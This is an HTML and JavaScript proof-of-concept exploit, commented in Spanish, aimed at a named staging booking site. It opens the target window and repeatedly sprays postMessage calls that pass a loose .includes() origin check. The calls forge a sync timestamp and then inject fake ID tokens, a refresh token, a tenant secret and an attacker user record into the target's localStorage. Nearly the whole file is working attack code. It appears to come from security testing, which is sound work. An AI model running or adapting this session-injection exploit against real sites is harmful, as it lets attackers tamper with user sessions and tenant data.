<!DOCTYPE html>
<html>
<head>
  <title>XD PoC</title>
</head>
<body>
  <button onclick="launchAttack()">Launch Attack</button>
  <div id="log" style="font-family:monospace;font-size:12px;margin-top:10px"></div>

<script>
const BOOKING_ORIGIN = "https://booking.staging-enviso.io";
const NAMESPACE = "cross-domain";

const FAKE_TOKENS = {
  id_token: "INJECTED_FAKE_ID_TOKEN",
  ad_id_token: "INJECTED_AD_TOKEN",
  refreshToken: "INJECTED_REFRESH_TOKEN",
  user: JSON.stringify({ id: 1337, email: "pwned@attacker.com", name: "INJECTED USER" }),
  lang: "en",
  TenantSecretKey: "INJECTED_TENANT_SECRET",
  tenant: "INJECTED_TENANT",
  tenants: "[]",
  lastLoginDate: new Date().toISOString(),
  guide: "false"
};

function log(msg, color="black") {
  document.getElementById('log').innerHTML +=
    `<div style="color:${color}">${new Date().toISOString()} — ${msg}</div>`;
}

function launchAttack() {
  log("Opening booking window...");
  const bookingWindow = window.open(BOOKING_ORIGIN, "booking");

  // Verificación: nuestro origen pasa el check .includes()
  log(`Our origin: ${location.origin}`);
  log(`Passes .includes check: ${location.origin.includes("https://cloud.staging-enviso.io")}`, "blue");

  // Spray de IDs cada ~5s, cubriendo el rango probable
  // El contador Ie arranca donde esté — cubrimos un rango amplio
  function sprayIds() {
    // Primero respondemos al getItem("ADS_LASTSYNC") con timestamp futuro
    // para forzar el branch PULL del doSync()
    for (let id = 0; id < 300; id++) {
      bookingWindow.postMessage({
        namespace: NAMESPACE,
        id: id,
        value: String(Date.now() + 9999999) // timestamp futuro → fuerza getmulti
      }, BOOKING_ORIGIN);
    }
    log("Phase 1: ADS_LASTSYNC spray sent (ids 0-299)", "orange");

    // 100ms después: spray con fake tokens para el getmulti
    setTimeout(() => {
      for (let id = 0; id < 300; id++) {
        bookingWindow.postMessage({
          namespace: NAMESPACE,
          id: id,
          value: FAKE_TOKENS
        }, BOOKING_ORIGIN);
      }
      log("Phase 2: FAKE_TOKENS spray sent (ids 0-299)", "orange");
    }, 100);
  }

  // Primera ronda: espera a que booking cargue (~2s)
  setTimeout(() => {
    log("Round 1 spray...");
    sprayIds();
  }, 2000);

  // Rondas siguientes: cada 5s (sincronizado con doSync)
  let round = 2;
  const interval = setInterval(() => {
    log(`Round ${round++} spray...`);
    sprayIds();
    if (round > 6) {
      clearInterval(interval);
      log("Spray finished. Check localStorage in booking tab.", "purple");
    }
  }, 5000);

  // Verificación final
  setTimeout(() => {
    try {
      const token = bookingWindow.localStorage?.getItem("id_token");
      log(`id_token in booking: ${token?.slice(0,30)}...`, token === "INJECTED_FAKE_ID_TOKEN" ? "green" : "red");
    } catch(e) {
      log("Cannot read booking localStorage directly (expected — cross-origin). Check manually.", "gray");
    }
  }, 30000);
}
</script>
</body>
</html>
